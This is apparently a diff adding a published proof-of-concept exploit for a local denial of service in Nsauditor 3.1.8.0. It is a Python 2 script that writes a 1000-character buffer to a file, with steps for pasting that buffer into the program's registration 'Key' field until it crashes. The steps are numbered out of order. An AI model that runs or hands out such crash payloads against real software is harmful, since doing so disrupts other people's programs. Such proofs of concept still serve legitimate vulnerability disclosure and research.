@@ -1,0 +1,37 @@
+# Exploit Title: Nsauditor 3.1.8.0 - 'Key' Denial of Service (PoC)
+# Discovery by: SajjadBnd
+# Date: 2019-11-30
+# Vendor Homepage: http://www.nsauditor.com
+# Software Link: http://www.nsauditor.com/downloads/nsauditor_setup.exe
+# Tested Version: 3.1.8.0
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 - Pro
+# Email : blackwolf@post.com
+
+# About App
+# Nsauditor Network Security Auditor is a powerful network security tool designed to scan networks 
+# and hosts for vulnerabilities, and to provide security alerts.Nsauditor network auditor checks enterprise 
+# network for all potential methods that a hacker might use to attack it and create a report of potential 
+# problems that were found , Nsauditor network auditing software significantly reduces the total cost of 
+# network management in enterprise environments by enabling IT personnel and systems administrators gather 
+# a wide range of information from all the computers in the network without installing server-side applications 
+# on these computers and create a report of potential problems that were found.
+ 
+# POC
+# 1.Run the python script, it will create a new file "dos.txt"
+# 3.Run Nsauditor and click on "Register -> Enter Registration Code"
+# 2.Paste the content of dos.txt into the Field: 'Key'
+# 6.click 'ok'
+# 5.Crashed ;)
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 1000
+try:
+    f=open("dos.txt","w")
+    print "[+] Creating %s bytes DOS payload.." %len(buffer)
+    f.write(buffer)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
